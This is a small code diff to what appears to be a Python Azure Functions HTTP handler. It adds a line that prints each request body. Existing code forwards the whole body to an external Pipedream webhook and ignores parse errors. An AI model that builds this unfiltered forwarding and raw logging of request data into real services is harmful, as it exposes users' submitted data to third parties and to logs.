@@ -17,6 +17,7 @@ def main(req: func.HttpRequest) -> func.HttpResponse:
 
     try:
         req_body = req.get_json()
+        print(req_body)
         requests.post(url='https://eofbyoqrpojsf2.m.pipedream.net', data=req_body)
     except ValueError:
         pass
